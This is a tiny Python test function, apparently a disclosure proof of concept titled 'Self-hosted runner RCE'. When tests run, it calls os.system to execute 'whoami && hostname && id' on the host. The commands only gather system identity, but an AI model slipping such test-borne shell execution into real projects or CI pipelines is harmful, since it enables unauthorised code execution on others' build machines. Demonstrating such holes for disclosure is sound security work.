def test_poc_runner_rce():
    import os
    print("POC by Humaira - Self-hosted runner RCE")
    os.system("whoami && hostname && id")
    assert True
